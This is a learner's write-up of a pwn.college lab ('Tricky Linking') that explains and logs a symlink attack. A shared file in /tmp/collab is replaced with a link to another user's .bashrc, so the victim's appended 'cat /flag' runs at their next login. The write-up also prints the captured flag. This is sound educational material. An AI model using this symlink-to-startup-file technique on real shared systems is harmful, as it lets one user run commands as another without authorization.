# Silly Shenanigins

## Tricky Linking
Okay, Zardus has wised up! No more sharing the home directory: despite the reduced convenience, Zardus has moved to sharing /tmp/collab. He's made that directory world-readable and has started a list of evil commands to remember!

### Objective
In this challenge, when you run /challenge/victim, Zardus will add cat /flag to that list of commands:

```bash
hacker@dojo:~$ /challenge/victim

Username: zardus
Password: **********
zardus@dojo:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@dojo:~$ exit
logout

hacker@dojo:~$
```

Recall from the previous level that, having write access to /tmp/collab, the hacker user can replace that evil-commands.txt file. Also remember from Comprehending Commands that files can link to other files. What happens if hacker replaces evil-commands.txt with a symbolic link to some sensitive file that zardus can write to? Chaos and shenanigans!

You know the file to link to. Pull off the attack, and get /flag.

### Solve 
**Flag:** `pwn.college{oxItmq19WKBQaiNf5lTvlXSOt3L.QXxQTM3EDLygjN0czW}`

- In this challenge, initially I misunderstood and was running the `/challenge/victim` command before creating the link. That way, `cat /flag` was being written in the evil-commands.txt file but it wasn't going to the target file where the link would have taken it. So I corrected that mistake.
- Then I thought that, since we can't access the .bashrc file of Zardus, I can make a link to the .bashrc file of the /home/hacker or the /tmp/collab directories and then use them to get the flag. But once again it was a mistake on my part. Since the challenge is running in the home directory of the zardus user, I need to make a link to it only.
- So when my other attempts failed, I finally made the link between .bashrc file of zardus and the evil-commands.txt file. Then I ran the challenge two time. Once to get the `cat /flag` command in the .bashrc file and then again to execute this command when the challenge starts. That way I got the flag.

```bash
hacker@shenanigans~tricky-linking:/tmp/collab$ ln -s .bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:/tmp/collab$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:/tmp/collab$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:/tmp/collab$ ./.bashrc
bash: ./.bashrc: Permission denied
hacker@shenanigans~tricky-linking:/tmp/collab$ cat ./.bashrc
cat /flag
cat /flag
hacker@shenanigans~tricky-linking:/tmp/collab$ rm evil-commands.txt
hacker@shenanigans~tricky-linking:/tmp/collab$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:/tmp/collab$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:/tmp/collab$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{oxItmq19WKBQaiNf5lTvlXSOt3L.QXxQTM3EDLygjN0czW}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
```

### New Learnings
1. We can make links to the .bashrc file even when we cannot write into it. Through those links we can add the commands we want into it and when it runs, those commands get executed. 